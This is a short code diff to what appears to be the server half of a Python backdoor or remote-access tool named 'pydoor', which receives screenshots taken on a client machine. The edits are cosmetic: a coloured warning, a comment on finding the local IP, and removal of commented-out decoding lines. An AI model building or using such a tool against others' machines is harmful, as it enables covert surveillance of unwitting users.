@@ -13,7 +13,7 @@ import threading
 try:
     import pyautogui
 except ImportError:
-    print("pyautogui not installed, please do not try to screenshot")
+    print(Fore.YELLOW + "WARNING: pyautogui not installed, please do not try to screenshot" + Fore.RESET)
 
 BUFFER = 4096
 
@@ -51,7 +51,7 @@ screenshot | Take a screenshot on the client and save it on the server.
 
 
 
-    def get_net_ip(self) -> None:
+    def get_net_ip(self) -> None: #Easy way to get local ip address so you don't need to specify it.
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         self.yourip = s.getsockname()[0]
@@ -77,13 +77,9 @@ screenshot | Take a screenshot on the client and save it on the server.
         elif "pydoor_null" in resp:
             return
         elif self.cmd == "screenshot":
-            #resp = encodedresp.replace(b"Screenshot ", b"")
-            #resp = resp.replace('.', '=')
-            #screenshot_bytes = base64.b64decode(resp)
+
             screenshot_bytes = encodedresp
             file_name = str(datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")) +".png"
-            #os.mknod(file_name)
-
             with open(file_name, 'wb+') as f:
                 f.write(screenshot_bytes)
             print(f"Screenshot saved as {file_name}")
